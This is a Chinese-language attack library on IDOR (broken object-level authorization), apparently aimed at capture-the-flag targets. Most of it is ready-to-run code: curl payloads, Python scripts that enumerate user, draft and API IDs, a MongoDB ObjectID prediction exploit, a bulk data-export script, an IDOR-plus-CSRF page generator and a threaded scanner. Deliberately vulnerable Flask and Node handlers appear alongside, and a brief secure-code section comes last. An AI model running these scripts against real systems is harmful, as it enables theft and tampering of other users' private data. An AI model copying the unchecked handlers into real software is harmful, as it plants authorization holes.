# IDOR-权限验证缺失 攻击库

## 漏洞概述

IDOR(Insecure Direct Object Reference)权限验证缺失是指应用程序允许用户通过直接对象引用(如ID、用户名等)访问资源,但未正确验证当前用户是否有权限访问该资源的漏洞。这是OWASP API Security Top 10中的#1漏洞(BOLA - Broken Object Level Authorization)。

**攻击价值**:
- 未授权访问其他用户数据
- 水平权限提升(访问同级用户资源)
- 垂直权限提升(访问管理员资源)
- 数据泄露和隐私侵犯
- 修改或删除他人资源

**常见场景**:
- 用户资料查看/编辑
- 订单/发票查询
- 文件/文档访问
- 草稿/消息查看
- API端点访问

## 核心攻击技术

### 1. 用户资料IDOR

**原理**: 应用程序通过用户ID访问资料,但不验证访问者身份

**漏洞代码示例 (Python/Flask)**:

```python
@app.route('/profile/<int:user_id>')
@login_required
def view_profile(user_id):
    # ⚠️ 问题: 只检查是否登录,不检查是否有权查看此用户资料
    user = User.query.get_or_404(user_id)
    return render_template('profile.html', user=user)
```

**攻击载荷**:

```bash
# 登录后访问自己的资料 (user_id=100)
curl -b cookies.txt http://target.com/profile/100

# IDOR: 修改ID访问其他用户资料
curl -b cookies.txt http://target.com/profile/1    # 管理员
curl -b cookies.txt http://target.com/profile/50   # 其他用户
curl -b cookies.txt http://target.com/profile/101  # 下一个用户
```

**Python自动化脚本**:

```python
#!/usr/bin/env python3
import requests

def exploit_profile_idor(base_url, session_cookie):
    """
    枚举用户资料IDOR
    
    参数:
        base_url: 目标URL
        session_cookie: 已登录的会话cookie
    """
    
    cookies = {'session': session_cookie}
    
    print("[*] 开始枚举用户资料...")
    
    for user_id in range(1, 200):
        url = f"{base_url}/profile/{user_id}"
        
        try:
            response = requests.get(url, cookies=cookies, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] 可访问 User ID {user_id}")
                
                # 检查是否包含敏感信息
                if any(keyword in response.text.lower() for keyword in 
                       ['email', 'phone', 'address', 'admin', 'flag']):
                    print(f"[!] User ID {user_id} 可能包含敏感数据!")
                    
                    # 提取敏感信息
                    import re
                    emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', response.text)
                    if emails:
                        print(f"    邮箱: {emails}")
                    
                    if 'flag' in response.text.lower():
                        flags = re.findall(r'flag\{[^}]+\}', response.text, re.I)
                        if flags:
                            print(f"    FLAG: {flags[0]}")
                            return flags[0]
            
            elif response.status_code == 403:
                print(f"[-] User ID {user_id}: 禁止访问")
            
            elif response.status_code == 404:
                # 用户不存在,可以跳过
                pass
        
        except Exception as e:
            print(f"[!] User ID {user_id}: 错误 - {e}")
    
    return None

# 使用示例
exploit_profile_idor("http://target.com", "user_session_token")
```

### 2. 草稿/文档IDOR

**原理**: 通过文档ID访问,未验证文档所有权

**漏洞代码示例**:

```python
@app.route('/edit_draft/<int:draft_id>', methods=['GET', 'POST'])
@login_required
def edit_draft(draft_id):
    draft = Draft.query.get_or_404(draft_id)
    
    # ⚠️ 问题: 权限检查被注释或缺失
    # if draft.author != current_user:
    #     return redirect(url_for('dashboard'))
    
    # 直接允许编辑任何草稿
    if request.method == 'POST':
        draft.title = request.form['title']
        draft.content = request.form['content']
        db.session.commit()
        return redirect(url_for('dashboard'))
    
    return render_template('edit_draft.html', draft=draft)
```

**攻击脚本**:

```python
def exploit_draft_idor(base_url, session_cookie):
    """利用草稿IDOR读取和修改他人草稿"""
    
    cookies = {'session': session_cookie}
    
    print("[*] 枚举草稿ID...")
    
    for draft_id in range(1, 100):
        url = f"{base_url}/edit_draft/{draft_id}"
        response = requests.get(url, cookies=cookies)
        
        if response.status_code == 200:
            print(f"[+] 可访问 Draft ID {draft_id}")
            
            # 提取草稿内容
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            title_field = soup.find('input', {'name': 'title'})
            content_field = soup.find('textarea', {'name': 'content'})
            
            if title_field and content_field:
                title = title_field.get('value', '')
                content = content_field.text
                
                print(f"    标题: {title}")
                print(f"    内容: {content[:100]}...")
                
                # 检查是否包含flag
                if 'flag' in content.lower():
                    print(f"[!] Draft {draft_id} 包含FLAG!")
                    import re
                    flag = re.search(r'flag\{[^}]+\}', content, re.I)
                    if flag:
                        print(f"    FLAG: {flag.group()}")
                        return flag.group()

# 使用示例
exploit_draft_idor("http://target.com", "user_session_cookie")
```

### 3. 通过用户名访问的IDOR

**原理**: 使用用户名而非ID,但同样缺少权限验证

**漏洞代码**:

```python
@app.route('/<username>/drafts')
@login_required
def view_user_drafts(username):
    user = User.query.filter_by(username=username).first_or_404()
    
    # ⚠️ 不检查current_user是否有权查看该用户草稿
    drafts = Draft.query.filter_by(author=user)
    return render_template('view_drafts.html', drafts=drafts, user=user)
```

**攻击载荷**:

```bash
# 访问自己的草稿
curl -b cookies.txt http://target.com/myuser/drafts

# IDOR: 访问其他用户草稿
curl -b cookies.txt http://target.com/admin/drafts
curl -b cookies.txt http://target.com/admin2/drafts
curl -b cookies.txt http://target.com/user1/drafts
```

**枚举脚本**:

```python
def enumerate_usernames(base_url, session_cookie):
    """枚举可访问的用户名"""
    
    # 常见用户名列表
    common_usernames = [
        'admin', 'admin1', 'admin2', 'administrator',
        'root', 'user', 'user1', 'test', 'guest',
        'moderator', 'manager', 'supervisor'
    ]
    
    cookies = {'session': session_cookie}
    
    for username in common_usernames:
        url = f"{base_url}/{username}/drafts"
        response = requests.get(url, cookies=cookies)
        
        if response.status_code == 200:
            print(f"[+] 可访问用户: {username}")
            
            # 检查是否包含草稿
            if 'draft' in response.text.lower():
                print(f"[!] {username} 有可读取的草稿!")
                
                # 查找flag
                if 'flag' in response.text.lower():
                    print(f"[!!!] {username} 的草稿中包含FLAG!")
```

### 4. API端点IDOR (BOLA)

**原理**: RESTful API未验证对象级权限

**漏洞代码 (Node.js)**:

```javascript
// ⚠️ 危险的API端点
app.get('/api/users/:user_id/orders', (req, res) => {
    const userId = req.params.user_id;
    
    // 只检查是否登录,不检查是否为本人
    if (!req.session.user) {
        return res.status(401).json({error: 'Unauthorized'});
    }
    
    // 直接返回指定用户的所有订单
    db.query('SELECT * FROM orders WHERE user_id = ?', [userId], (err, orders) => {
        res.json(orders);
    });
});
```

**攻击脚本**:

```python
def exploit_api_idor(api_url, auth_token, target_user_id):
    """
    利用API IDOR访问其他用户数据
    
    参数:
        api_url: API基础URL
        auth_token: 认证令牌
        target_user_id: 目标用户ID
    """
    
    headers = {
        'Authorization': f'Bearer {auth_token}',
        'Content-Type': 'application/json'
    }
    
    # 常见API端点
    endpoints = [
        f'/api/users/{target_user_id}',
        f'/api/users/{target_user_id}/profile',
        f'/api/users/{target_user_id}/orders',
        f'/api/users/{target_user_id}/messages',
        f'/api/users/{target_user_id}/settings',
        f'/api/users/{target_user_id}/documents',
    ]
    
    for endpoint in endpoints:
        url = api_url + endpoint
        
        try:
            response = requests.get(url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] 成功访问: {endpoint}")
                
                try:
                    data = response.json()
                    print(f"    数据: {json.dumps(data, indent=2)[:200]}...")
                except:
                    print(f"    响应: {response.text[:200]}...")
            
            elif response.status_code == 403:
                print(f"[-] 禁止访问: {endpoint}")
            
            elif response.status_code == 404:
                print(f"[-] 不存在: {endpoint}")
        
        except Exception as e:
            print(f"[!] 错误: {endpoint} - {e}")

# 枚举多个用户ID
for user_id in range(1, 20):
    print(f"\n=== 测试 User ID: {user_id} ===")
    exploit_api_idor("http://api.target.com", "user_token", user_id)
```

### 5. MongoDB ObjectID预测IDOR

**原理**: MongoDB ObjectID可预测,结合IDOR访问其他用户

**ObjectID结构**:
```
24位十六进制 = 12字节
[Timestamp:8位][Machine:6位][PID:4位][Counter:6位]

示例: 507f191e810c19729de860ea
```

**攻击脚本**:

```python
def predict_first_user_objectid(my_objectid, distance):
    """
    基于当前用户ObjectID和distance预测第一个用户ID
    
    参数:
        my_objectid: 当前用户的ObjectID (24位hex)
        distance: 与第一个用户的counter差值
    """
    
    # 分解ObjectID
    timestamp_part = my_objectid[:8]   # 时间戳
    machine_pid = my_objectid[8:18]    # 机器标识+进程ID
    my_counter = int(my_objectid[18:24], 16)  # counter
    
    # 计算第一个用户的counter
    first_counter = my_counter - distance
    first_counter_hex = format(first_counter, '06x')
    
    # 构造第一个用户的ObjectID
    first_objectid = timestamp_part + machine_pid + first_counter_hex
    
    return first_objectid

def exploit_objectid_idor(target_url):
    """完整的ObjectID预测+IDOR利用"""
    
    # 步骤1: 注册新用户获取ObjectID和distance
    print("[*] 注册新用户...")
    response = requests.post(f"{target_url}/register", data={
        'username': 'attacker123',
        'password': 'password123'
    })
    
    data = response.json()
    my_id = data['userId']
    distance = data.get('distance', 0)
    
    print(f"[+] 我的ObjectID: {my_id}")
    print(f"[+] Distance: {distance}")
    
    # 步骤2: 预测第一个用户ObjectID
    first_id = predict_first_user_objectid(my_id, distance)
    print(f"[+] 预测的第一个用户ID: {first_id}")
    
    # 步骤3: IDOR访问第一个用户资料
    print("[*] 尝试访问第一个用户资料...")
    response = requests.get(f"{target_url}/profile/{first_id}")
    
    if response.status_code == 200:
        print("[+] 成功访问!")
        
        if 'flag' in response.text.lower():
            import re
            flag = re.search(r'flag\{[^}]+\}', response.text, re.I)
            if flag:
                print(f"[+] FLAG: {flag.group()}")
                return flag.group()
    
    return None

# 使用示例
exploit_objectid_idor("http://target.com")
```

### 6. 顺序ID枚举IDOR

**原理**: 使用自增ID,容易枚举所有对象

**攻击脚本**:

```python
def enumerate_sequential_ids(base_url, endpoint_template, session_cookie, 
                             start_id=1, end_id=1000):
    """
    枚举顺序ID的IDOR
    
    参数:
        endpoint_template: 端点模板,如 '/api/order/{id}'
        start_id: 起始ID
        end_id: 结束ID
    """
    
    cookies = {'session': session_cookie}
    accessible_ids = []
    
    print(f"[*] 枚举 ID 范围: {start_id} - {end_id}")
    
    for obj_id in range(start_id, end_id + 1):
        url = base_url + endpoint_template.format(id=obj_id)
        
        try:
            response = requests.get(url, cookies=cookies, timeout=3)
            
            if response.status_code == 200:
                accessible_ids.append(obj_id)
                print(f"[+] ID {obj_id}: 可访问")
                
                # 提取关键信息
                if 'admin' in response.text.lower():
                    print(f"[!] ID {obj_id}: 可能是管理员资源!")
                
                if 'flag' in response.text.lower():
                    print(f"[!!!] ID {obj_id}: 包含FLAG!")
                    import re
                    flag = re.search(r'flag\{[^}]+\}', response.text, re.I)
                    if flag:
                        print(f"      FLAG: {flag.group()}")
                        return flag.group()
            
            # 进度显示
            if obj_id % 100 == 0:
                print(f"[*] 进度: {obj_id}/{end_id}")
        
        except Exception as e:
            pass
    
    print(f"\n[*] 完成! 发现 {len(accessible_ids)} 个可访问对象")
    return accessible_ids

# 使用示例
enumerate_sequential_ids(
    "http://target.com",
    "/api/document/{id}",
    "session_cookie",
    start_id=1,
    end_id=500
)
```

## 高级利用技术

### 1. 批量导出数据

```python
def batch_export_idor(base_url, endpoint, id_range, session_cookie):
    """批量导出IDOR数据"""
    
    import csv
    from datetime import datetime
    
    # 创建CSV文件
    filename = f"idor_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    
    with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(['ID', 'Status', 'Data'])
        
        cookies = {'session': session_cookie}
        
        for obj_id in id_range:
            url = f"{base_url}{endpoint.format(id=obj_id)}"
            
            try:
                response = requests.get(url, cookies=cookies, timeout=5)
                
                if response.status_code == 200:
                    # 尝试解析JSON
                    try:
                        data = response.json()
                        writer.writerow([obj_id, 'Success', str(data)])
                    except:
                        writer.writerow([obj_id, 'Success', response.text[:500]])
                else:
                    writer.writerow([obj_id, f'Error-{response.status_code}', ''])
            
            except Exception as e:
                writer.writerow([obj_id, 'Exception', str(e)])
    
    print(f"[+] 数据已导出到: {filename}")
```

### 2. IDOR + CSRF组合攻击

```python
def idor_csrf_combo(target_url, victim_id, malicious_data):
    """
    IDOR + CSRF组合攻击
    
    利用IDOR修改其他用户数据,结合CSRF绕过CSRF保护
    """
    
    # 生成CSRF攻击页面
    csrf_html = f'''
    <html>
    <body>
        <h1>Please wait...</h1>
        <form id="evil" method="POST" action="{target_url}/api/user/{victim_id}/update">
            <input name="email" value="{malicious_data['email']}">
            <input name="phone" value="{malicious_data['phone']}">
        </form>
        <script>
            document.getElementById('evil').submit();
        </script>
    </body>
    </html>
    '''
    
    with open('idor_csrf.html', 'w') as f:
        f.write(csrf_html)
    
    print("[+] CSRF payload已生成: idor_csrf.html")
    print("[*] 诱导受害者访问此页面即可修改其数据")
```

### 3. IDOR自动化扫描工具

```python
#!/usr/bin/env python3
import requests
import threading
from queue import Queue

class IDORScanner:
    """IDOR漏洞自动化扫描工具"""
    
    def __init__(self, base_url, session_cookie, threads=10):
        self.base_url = base_url
        self.session_cookie = session_cookie
        self.threads = threads
        self.queue = Queue()
        self.results = []
        self.lock = threading.Lock()
    
    def scan_endpoint(self, endpoint_template, id_range):
        """扫描单个端点的IDOR漏洞"""
        
        # 添加任务到队列
        for obj_id in id_range:
            self.queue.put((endpoint_template, obj_id))
        
        # 启动工作线程
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self._worker)
            t.start()
            threads.append(t)
        
        # 等待完成
        self.queue.join()
        
        # 停止线程
        for i in range(self.threads):
            self.queue.put(None)
        for t in threads:
            t.join()
        
        return self.results
    
    def _worker(self):
        """工作线程"""
        cookies = {'session': self.session_cookie}
        
        while True:
            item = self.queue.get()
            
            if item is None:
                break
            
            endpoint_template, obj_id = item
            url = self.base_url + endpoint_template.format(id=obj_id)
            
            try:
                response = requests.get(url, cookies=cookies, timeout=5)
                
                if response.status_code == 200:
                    with self.lock:
                        self.results.append({
                            'id': obj_id,
                            'url': url,
                            'status': 200,
                            'data': response.text[:500]
                        })
                        print(f"[+] 发现IDOR: ID {obj_id}")
            
            except Exception as e:
                pass
            
            finally:
                self.queue.task_done()
    
    def report(self):
        """生成报告"""
        print(f"\n{'='*60}")
        print(f"IDOR扫描报告")
        print(f"{'='*60}")
        print(f"发现 {len(self.results)} 个可访问对象\n")
        
        for result in self.results[:10]:  # 只显示前10个
            print(f"ID: {result['id']}")
            print(f"URL: {result['url']}")
            print(f"数据: {result['data'][:100]}...\n")

# 使用示例
if __name__ == "__main__":
    scanner = IDORScanner(
        base_url="http://target.com",
        session_cookie="user_session",
        threads=20
    )
    
    scanner.scan_endpoint("/api/user/{id}/profile", range(1, 1000))
    scanner.report()
```

## 防御检测

**安全的代码实现**:

```python
# Flask示例
@app.route('/profile/<int:user_id>')
@login_required
def view_profile(user_id):
    # ✅ 正确: 检查权限
    if current_user.id != user_id and not current_user.is_admin:
        abort(403)  # 禁止访问
    
    user = User.query.get_or_404(user_id)
    return render_template('profile.html', user=user)

# Node.js示例
app.get('/api/users/:user_id/orders', (req, res) => {
    const requestedUserId = req.params.user_id;
    const currentUserId = req.session.user.id;
    
    // ✅ 正确: 验证对象级权限
    if (requestedUserId != currentUserId && !req.session.user.isAdmin) {
        return res.status(403).json({error: 'Access denied'});
    }
    
    // 查询订单
    db.query('SELECT * FROM orders WHERE user_id = ?', [requestedUserId], ...);
});
```

## 关键成功要点

1. **识别直接对象引用**: ID、用户名、文件名等
2. **枚举技术**: 顺序枚举、预测算法
3. **权限验证缺失**: 检测是否有权限检查逻辑
4. **批量测试**: 自动化扫描大量ID
5. **数据提取**: 从响应中提取敏感信息

## 成功标志

- 以普通用户身份访问其他用户资源
- 访问管理员特权功能或数据
- 读取/修改他人私有文档
- 获取flag或其他敏感信息
- 导出大量用户数据
